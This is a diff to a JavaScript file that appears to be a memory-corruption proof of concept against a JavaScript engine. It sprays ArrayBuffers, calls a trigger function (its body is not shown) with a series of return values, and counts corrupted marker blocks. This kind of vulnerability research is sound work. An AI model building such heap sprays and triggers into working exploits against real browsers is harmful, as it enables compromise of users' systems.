@@ -1,4 +1,4 @@
-import { log } from './module/utils.mjs';
+import { log } from './utils.mjs';
 
 const MARK = 0x42424242;
 
@@ -46,29 +46,39 @@ function trigger(returnVal) {
 }
 
 function check(left, right) {
+    let corrupted = 0;
     for (let i = 0; i < left.length; i++) {
         const v = new Uint32Array(left[i]);
         if (v[0] !== MARK || v[1] !== 0x11111111) {
             log("Left block corrupted at" + i + v[0] + v[1]);
+            corrupted++;
         }
     }
     for (let i = 0; i < right.length; i++) {
         const v = new Uint32Array(right[i]);
         if (v[0] !== 0x99999999 || v[1] !== MARK) {
             log("Right block corrupted at" + i + v[0] + v[1]);
+            corrupted++;
         }
     }
+    return corrupted;
 }
 
 function main() {
-    const returnValue = -889;
-    log("Return value:" + returnValue);
-    const { left, right } = allocSpray(20, 20);
-    const tmp = [];
-    for (let i = 0; i < 200; i++) tmp.push(new ArrayBuffer(0x1000));
+    const values = [-889, -1000, -500, -100, -10, 0, 10, 100, 500, 1000];
+    
+    for (const returnValue of values) {
+        log("Testing return value:" + returnValue);
+        const { left, right } = allocSpray(20, 20);
+        const tmp = [];
+        for (let i = 0; i < 200; i++) tmp.push(new ArrayBuffer(0x1000));
 
-    trigger(returnValue);
-    check(left, right);
+        trigger(returnValue);
+        const corrupted = check(left, right);
+        log("Corrupted blocks:" + corrupted);
+        log("---");
+    }
+    
     log("done");
 }
 
